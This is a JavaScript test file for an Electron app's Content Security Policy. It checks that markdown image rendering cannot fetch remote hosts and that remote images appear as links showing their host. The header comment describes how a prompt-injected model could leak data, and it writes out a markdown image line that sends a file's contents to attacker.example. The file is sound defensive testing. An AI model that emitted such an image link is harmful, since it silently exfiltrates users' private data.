import test from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

/**
 * The Content Security Policy is a security control that lives in a string
 * literal, so nothing else can check it. These read the source.
 *
 * The rule that matters: `img-src` must not allow https. The renderer displays
 * model output as markdown, and an <img> is fetched the instant it renders, so a
 * prompt-injected model could emit
 * `![](https://attacker.example/?d=<file it just read>)` and the data would leave
 * silently, with no click and nothing visible. Markdown.tsx offers remote images
 * as links instead; this directive is what makes a missed path fail closed.
 */

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..')
const INDEX = fs.readFileSync(path.join(ROOT, 'electron/main/index.ts'), 'utf8')
const MARKDOWN = fs.readFileSync(path.join(ROOT, 'src/components/Markdown.tsx'), 'utf8')

/** Every `img-src …` directive written in the main process. */
function imgSrcDirectives(): string[] {
  return [...INDEX.matchAll(/"(img-src [^"]*)"/g)].map((m) => m[1])
}

test('both the dev and packaged policies declare img-src', () => {
  // Two policies exist. If one ever loses its directive, the default-src
  // fallback would silently permit whatever default-src allows.
  assert.equal(imgSrcDirectives().length, 2)
})

test('no img-src permits remote http or https', () => {
  for (const directive of imgSrcDirectives()) {
    assert.ok(!/https:/.test(directive), `img-src allows https: ${directive}`)
    assert.ok(!/http:/.test(directive), `img-src allows http: ${directive}`)
    assert.ok(!directive.includes('*'), `img-src uses a wildcard: ${directive}`)
  }
})

// Generated images arrive as data: URLs from readLocalImage and are never
// fetched over the network, so blocking them would break a working feature for
// no gain.
test('data: and blob: remain allowed, so local and generated images still render', () => {
  for (const directive of imgSrcDirectives()) {
    assert.match(directive, /data:/)
    assert.match(directive, /blob:/)
  }
})

test('the renderer never emits an img element for a remote source', () => {
  // The data: branch must come first and return, so the https branch below it
  // cannot reach an <img>.
  const dataBranchAt = MARKDOWN.indexOf("src.startsWith('data:')")
  const httpBranchAt = MARKDOWN.indexOf('if (isHttpUrl(src))')
  assert.ok(dataBranchAt > 0, 'data: branch missing')
  assert.ok(httpBranchAt > dataBranchAt, 'remote branch must come after the data: branch')

  const remoteBranch = MARKDOWN.slice(httpBranchAt, httpBranchAt + 700)
  assert.ok(!/<img/.test(remoteBranch), 'remote images must render as a link, not an <img>')
  assert.match(remoteBranch, /md-remote-img/)
})

// Seeing the destination is the entire protection once loading is a decision.
test('the remote-image link shows its host', () => {
  assert.match(MARKDOWN, /md-remote-img-host/)
  assert.match(MARKDOWN, /function hostOf/)
})

test('the preview pane is deliberately outside this policy', () => {
  // hardenSession configures defaultSession; the pane runs on its own partition,
  // so a user's dev server is not subject to the app's CSP. If this ever changed
  // to a global handler, someone's own site would start breaking in the preview.
  assert.match(INDEX, /session\.defaultSession\.webRequest\.onHeadersReceived/)
  const preview = fs.readFileSync(path.join(ROOT, 'electron/main/preview.ts'), 'utf8')
  assert.ok(
    !/onHeadersReceived/.test(preview),
    'the preview session must not impose a CSP on the user own dev server'
  )
})
